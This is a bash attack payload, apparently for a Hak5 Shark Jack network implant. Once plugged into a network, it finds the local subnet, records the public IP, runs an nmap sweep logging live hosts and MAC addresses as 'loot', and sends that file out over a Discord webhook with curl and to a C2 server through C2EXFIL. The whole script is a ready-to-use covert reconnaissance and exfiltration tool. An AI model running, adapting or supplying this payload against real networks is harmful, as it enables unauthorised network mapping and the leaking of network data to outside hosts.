#!/bin/bash

# Author: Hackazillarex
# v1.4
# This script waits for an internet connection, scans the local subnet for online devices,
# logs the local IP, public IP, and device information, stores the results in a timestamped file,
# and then connects to the C2 server to exfiltrate the loot.

# LED SETUP
# Turn on Discord Integration (Yes = 1, No = 0)
DISCORD=0
WEBHOOK='PLACE_DISCORD_WEBHOOK_HERE'
URL="place C2 url here"
# Send Loot as File or Plain Messages (File = 1, Messages = 0)
AS_FILE=0

# Folder for loot
LOOT_DIR="/root/loot/hackazillarex"
mkdir -p "$LOOT_DIR"

# Check for device config
if [ -f "/etc/device.config" ]; then
    INITIALIZED=1
else
    INITIALIZED=0
fi

# Set the network mode to DHCP and wait for a connection
LED SETUP
NETMODE DHCP_CLIENT
while ! ifconfig eth0 | grep "inet addr"; do
    LED Y SOLID
    sleep .2
    LED M SOLID
    sleep .8
done

# Wait for internet connection
while ! wget $URL -qO /dev/null; do sleep 1; done

# Get the gateway IP and subnet
GET_GATEWAY=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
while [ $GET_GATEWAY == "" ]; do sleep 1; done
INTERNAL_IP=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
SUBNET=$(echo "$GET_GATEWAY" | awk -F"." '{print $1"."$2"."$3".0/24"}')
CHK_SUB=$(echo $INTERNAL_IP | cut -d"." -f1-3)
FIN_SUB="${CHK_SUB}.0/24"

LED ATTACK
if [ "$SUBNET" != "$FIN_SUB" ]; then
    LED R FAST
    sleep 2
    LED R SOLID
else
    # Fix for Timestamp Update
    ntpd -gq; sleep 1
    DATE_FORMAT=$(date '+%m-%d-%Y_%H:%M:%S')
    LOOT_FILE="$LOOT_DIR/nmap-${DATE_FORMAT}.txt"

    if [ ! -f "$LOOT_FILE" ]; then
        touch "$LOOT_FILE"
    fi

    # Get Public IP and run NMAP scan
    PUBLIC_IP=$(wget -q "http://api.ipify.org" -O -)
    echo -e "\nPublic IP: ${PUBLIC_IP}\nOnline Devices for ${SUBNET}:\n--------------------------------------------\n" >> "$LOOT_FILE"

    LED C VERYFAST
    run_nmap () {
        nmap -sn --privileged "$SUBNET" --exclude "$INTERNAL_IP" | awk '/Nmap scan report for/{printf " -> ";printf $5;}/MAC Address:/{print " - "substr($0, index($0,$3)) }' >> "$LOOT_FILE"
    }

    run_nmap &
    PID=$!
    while kill -0 "$PID" 2>&1 >/dev/null; do
        wait $PID
    done

    if [ -s "$LOOT_FILE" ]; then
        # Send loot to Discord if enabled
        if [ "$DISCORD" == 1 ]; then
            CURL_CHK=$(which curl)
            if [ "$CURL_CHK" != "/usr/bin/curl" ]; then
                LED Y VERYFAST
                opkg update;opkg install libcurl curl
            fi
            LED Y SOLID
            if [ "$AS_FILE" == 1 ]; then
                curl -s -i -H 'Content-Type: multipart/form-data' -F "FILE=@$LOOT_FILE" -F 'payload_json={ "wait": true, "content": "Loot has arrived!", "username": "SharkJack" }' $WEBHOOK
            fi
            if [ "$AS_FILE" == 0 ]; then
                while read -r line; do
                    DISCORD_MSG="**$line**"
                    curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$DISCORD_MSG\"}" $WEBHOOK
                done < "$LOOT_FILE"
            fi
            LED G SOLID; sleep 2
        fi

        # If initialized, connect to the C2 server
        if [ "$INITIALIZED" == 1 ]; then
            LED Y SOLID
            if [ -z "$(pgrep cc-client)" ]; then
                C2CONNECT
                while ! pgrep cc-client; do LED B SOLID; sleep .2; LED G SOLID; sleep .8; done
            fi
            # Re-issuing C2CONNECT to verify loot push to C2
            C2CONNECT
            sleep 2
            C2EXFIL STRING "${LOOT_FILE}" "Nmap Diagnostic for Network ${SUBNET}"
            LED M VERYFAST
            sleep 2
        fi

        LED FINISH
    else
        LED R SOLID
        rm -rf "$LOOT_FILE"
    fi
fi
